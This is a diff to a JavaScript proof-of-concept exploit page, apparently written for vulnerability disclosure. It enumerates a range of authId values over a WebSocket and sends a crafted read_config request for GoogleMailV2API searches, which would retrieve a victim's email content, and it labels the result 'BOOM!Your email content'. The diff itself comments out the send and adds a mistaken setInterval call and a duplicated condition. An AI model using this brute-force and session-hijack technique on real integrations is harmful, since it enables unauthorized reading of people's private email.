@@ -10,15 +10,16 @@
 	  function init()
 	  {
 		output = document.getElementById("output");
-		 writeToScreen("Try to brute your authId......");
+		writeToScreen("Try to brute your authId......");
 		for(var i = 34028803;i <= 34028883;i++){
 			writeToScreen("authId is" + i);
-			testWebSocket(i);
+			setInterval(testWebSocket(i),4000);
+			//testWebSocket(i);
 		}
 	  }
 
 	  function testWebSocket(authId)
-	  {
+	  {	
 		websocket = new WebSocket(wsUri);
 		websocket.onopen = function(evt) { onOpen(evt,authId) };
 		websocket.onclose = function(evt) { onClose(evt) };
@@ -29,7 +30,7 @@
 	  function onOpen(evt,authId)
 	  {
 		writeToScreen("CONNECTED");
-		doSend('{"read_config":{"accountId":"1111111","action":"search","selectedAPI":"GoogleMailV2API","authId":'+ authId +',"params":{"query":"facebook"},"typeOf":"read_bulk","zapId":"111111"}}');
+		//doSend('{"read_config":{"accountId":"1111111","action":"search","selectedAPI":"GoogleMailV2API","authId":'+ authId +',"params":{"query":"facebook"},"typeOf":"read_bulk","zapId":"111111"}}');
 	  }
 
 	  function onClose(evt)
@@ -40,9 +41,10 @@
 	  function onMessage(evt)
 	  {
 	 	let data = JSON.parse(evt.data);
-        	if(data.type === "END_READ"){
+        	if(data.type === "END_READ"||data.type === "END_READ"){
                 	//writeToScreen('<span style="color: red;">Your email content:</span> ');
 		    	//just a POC for prove the impact,Didn't wrote a feature for keeping on WSS connection.
+			
 		}else{
 			writeToScreen('<span style="color: red;">BOOM!Your email content:</span> ' + JSON.stringify(data));
 		}
